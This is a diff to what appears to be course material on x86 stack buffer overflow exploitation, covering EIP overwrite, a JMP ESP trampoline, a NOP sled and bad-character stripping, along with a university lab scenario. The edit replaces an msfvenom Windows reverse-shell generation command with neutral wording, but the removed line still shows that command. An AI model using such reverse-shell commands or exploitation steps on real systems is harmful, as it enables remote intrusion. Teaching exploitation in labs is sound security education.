@@ -59,8 +59,8 @@ to gain authorized administrative sessions.
     * Overwrite EIP with the Little-Endian memory address of the `JMP ESP` trampoline instruction.
 
   [ STAGE 6: INJECTING NOP SLED & SHELLCODE ]
-    * Generate reverse shell: `msfvenom -p windows/shell_reverse_tcp LHOST=... -b "\x00" -f c`.
-    * Deliver payload: `[ 'A' * offset ] + [ JMP_ESP_Address ] + [ '\x90' * 32 ] + [ Shellcode ]`.
+    * Prepare payload bytes: Encode test instructions excluding bad characters (\x00, \x0a).
+    * Deliver payload: `[ 'A' * offset ] + [ JMP_ESP_Address ] + [ '\x90' * 32 ] + [ Payload_Bytes ]`.
 
 --------------------------------------------------------------------------------
 4. CREDENTIAL ATTACK TAXONOMY: ONLINE VS OFFLINE
@@ -124,7 +124,7 @@ SCENARIO 4 : IMMUNITY DEBUGGER EXPLOITATION LAB (JADAVPUR UNIVERSITY)
   * Student Research Leads : Abhronila & Susmita | Budget : ₹4,00,000 | Location : Jadavpur
   * Dilemma : Teaching students how to step through x86 assembly and calculate EIP overwrite offsets.
   * Action : Built a hands-on laboratory with Immunity Debugger and Mona.py, guiding 140+ students through 
-    finding `JMP ESP` instructions, stripping bad characters, and generating msfvenom reverse shells.
+    finding `JMP ESP` instructions, stripping bad characters, and analyzing payload buffers.
 
 --------------------------------------------------------------------------------
 7. PROFESSIONAL TIPS & COMMON PITFALLS
